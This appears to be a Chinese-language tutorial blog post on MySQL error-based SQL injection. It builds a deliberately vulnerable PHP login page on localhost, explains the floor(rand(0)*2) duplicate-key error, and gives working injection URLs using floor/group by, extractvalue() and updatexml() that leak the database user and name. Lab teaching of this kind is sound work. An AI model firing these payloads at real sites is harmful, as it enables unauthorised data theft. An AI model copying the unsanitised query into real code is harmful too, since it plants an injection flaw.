---
layout: post
title: Error Based SQL Injection
tags: [security,web]
hidden: true
---

最近整理了一下mysql报错注入的几种方法，这里给出一个本地实例来进行说明，希望能够帮助初学者更快更容易地掌握报错注入的方法。

### 0x00 什么时候可以使用报错注入？

这里拿一个例子来说，在php中操作mysql数据库时，如果当数据库查询出错时，没有显示的输出`mysql_error()`，那么当查询出错时，服务端不会返回任何与数据库有关的信息，但是可能会导致页面异常活着其他的一些现象。

但是如果在php代码里，当查询出错时显示的输出了`mysql_error()`，那就会返回mysql具体的错误信息，可能是如下这些信息：

    1. The Used Select Statements Have Different Number Of Columns.
    2. Unknown Column 1 or no columns at all.
    4. Table 'xxxx' is not exists.
    3. Error #1604

当看到这些信息的时候，就要留意了，很有可能在这个页面上存在着注入。

下面就以一个简单的例子来说明如何基于错误信息来进行注入。

### 0x01 本地环境搭建

首先在本地建立一个测试数据库`sqli`：

    mysql> create database sqli;

建立一个测试表`user`和插入一些施力数据：

    mysql> create table user (
            id int(11) not null auto_increment primary key,
            name varchar(20) not null,
            pass varchar(32) not null
        );
    mysql> insert into user (name, pass) values ('admin', md5('123456')), ('guest', md5('guest'));

数据库准备好后，在站点根目录或者其子目录建立如下文件：

**index.php**

```php
<?php
$conn = mysql_connect("localhost", "root", "root");
if (!$conn) {
    die("Connection failed: " . mysql_error());
}

mysql_select_db("sqli", $conn);

// verify login info
if (isset($_GET['name']) && isset($_GET['pass'])) {
    $name = $_GET['name'];
    $pass = md5($_GET['pass']);

    $query = "select * from user where name='$name' and pass='$pass'";

    if ($result = mysql_query($query, $conn)) {
        $row = mysql_fetch_array($result, MYSQL_ASSOC);

        if ($row) {
            echo "<script>alert('login successful!');</script>";
        }
    } else {
        die("Operation error: " . mysql_error());
    }
}

mysql_close();
?>

<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
</head>
<body>
<center>
    <form method="get" action="">
        <label>User:</label><input type="text" name="name" value=""/><br/>
        <label>Pass:</label><input type="password" name="pass" value=""/><br/>
        <input type="submit" value="login"/>
    </form>
</center>
</body>
</html>
```

我将上述文件放在了站点的子目录`sqli/`下，访问`http://localhost/sqli/`可以看到。

上面这段php验证登陆的代码很简单，注意下面这几行：

    $name = $_GET['name'];
    $pass = md5($_GET['pass']);
    
    $query = "select * from user where name='$name' and pass='$pass'";

登陆验证部分，取了$_GET['name']和$_GET['pass']的值，并且提交的密码经过了md5()的处理才插入到查询语句中，所以$pass的值不可控。

但在这里$name是一个很明显的注入点，并且在php代码里还十分完备地判断了查询过程，当查询出错时会抛出`mysql_error()`信息。

例如，在浏览器中访问`http://localhost/sqli/index.php?name=admin&pass=123456`：

浏览器会alert一条消息`login successful!`。

当访问`http://localhost/sqli/index.php?name=admin'&pass=123456`时（name变量多一个单引号），会出现错误：

    Operation error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'e10adc3949ba59abbe56e057f20f883e'' at line 1

下面首先说明报错注入的原理，然后再谈谈目前常见的报错诸如方法，对其他常规的注入方法这里就不多阐述。

### 0x02 报错注入原理

目前比较常见的几种报错注入的方法都是利用了mysql某些不能称为bug的bug来实现的。

下面就以 ``rand()`` 函数来进行说明。mysql的官方文档中对 ``rand()`` 函数有特殊的说明：

> RAND() in a WHERE clause is re-evaluated every time the WHERE is executed. 
  You cannot use a column with RAND() values in an ORDER BY clause, because ORDER BY would evaluate the column multiple times. However, you can retrieve rows in random order like this: 

官方文档中的意思是：在where语句中，where每执行一次，rand()函数就会被计算一次。rand()不能作为order by的条件字段，同理也不能作为group by的条件字段。

因此在mysql中，可以构造一个值不确定而有可重复的字段作为group by的条件字段，这是就可以报出类似于`Duplicate entry '...' for key 'group_key'`的错误，这里的`...`就是构造的payload。

这里做一个测试，以前面所建的`user`表为例：

    mysql> select count(*),floor(rand(0)*2) from user group by 2;

输出可能为下列这几种情况：

第1种：

    +----------+-----------------+
    | count(*) | floor(rand()*2) |
    +----------+-----------------+
    |        1 |               0 |
    |        1 |               1 |
    +----------+-----------------+
    2 rows in set (0.00 sec)

第2种：

    +----------+-----------------+
    | count(*) | floor(rand()*2) |
    +----------+-----------------+
    |        2 |               1 |
    +----------+-----------------+
    1 row in set (0.00 sec)

第3种：

    +----------+-----------------+
    | count(*) | floor(rand()*2) |
    +----------+-----------------+
    |        2 |               0 |
    +----------+-----------------+
    1 row in set (0.00 sec)

第4种：

    +----------+-----------------+
    | count(*) | floor(rand()*2) |
    +----------+-----------------+
    |        1 |               1 |
    |        1 |               0 |
    +----------+-----------------+
    2 rows in set (0.00 sec)

第5种：

    ERROR 1062 (23000): Duplicate entry '1' for key 'group_key'

第6种：

    ERROR 1062 (23000): Duplicate entry '0' for key 'group_key'

这里很容易地可以知道第5、6种情况是因为计算 ``floor(rand()*2)`` 时，产生了相同的值从而产生了重复的行而报错。

这里为了让每次 ``floor(rand()*2)`` 都产生同样的值，可以设置一个随机种子（一般为0），像这样：``floor(rand(0)*2)``。

然后再次测试，这里为了尽可能多地出现不确定且可重复的值，将查找表换为 ``information_schema.tables``：

    mysql> select count(*),floor(rand(0)*2) from information_schema.tables group by 2;

此时就必报错：

    ERROR 1062 (23000): Duplicate entry '1' for key 'group_key'

因此我们可以将需要查询的语句与`floor(rand(0)*2)`进行字符连接，就可以通过报错来得到信息。

    mysql> select count(*),concat(user(),floor(rand(0)*2)) from information_schema.tables group by 2;

得到`user()`的数据：

    ERROR 1062 (23000): Duplicate entry 'root@localhost:sqli1' for key 'group_key'

### 0x03 报错注入方法

法一：`floor()`or`round()`函数，group by利用：

    floor：函数只返回整数部分，小数部分舍弃。
    round：函数四舍五入，大于0.5的部分进位，不到则舍弃。

example1：

    select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a

本地环境测试：

    http://localhost/sqli/index.php?name='+or+(select+1+from+(select+count(*),concat(user(),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)+%23&pass=1

报错注入得到：

    Operation error: Duplicate entry 'root@localhost1' for key 'group_key'

example2：

    select count(*) from information_schema.tables group by concat(user(),floor(rand(0)*2))

本地环境测试：

    http://localhost/sqli/index.php?name='+or+(select+count(*)+from+information_schema.tables+group+by+concat(user(),floor(rand(0)*2)))+%23&pass=1

报错注入得到：

    Operation error: Duplicate entry 'root@localhost1' for key 'group_key'

法二：`extractvalue()`函数，利用XPath语法错误导致报错：

    extractvalue(1,concat(user())

本地环境测试：

    http://localhost/sqli/index.php?name='+or+extractvalue(1,concat(user(),database()))+%23&pass=1

报错注入得到：

    Operation error: XPATH syntax error: '@localhostsqli'

法三：`updatexml()`函数，同样是利用语法错误导致报错：

    updatexml(1,concat(user()),1)

本地环境测试：

    http://localhost/sqli/index.php?name='+or+updatexml(1,concat(user(),0x3a,database()),1)+%23&pass=1

报错注入得到：

    Operation error: XPATH syntax error: '@localhost:sqli'
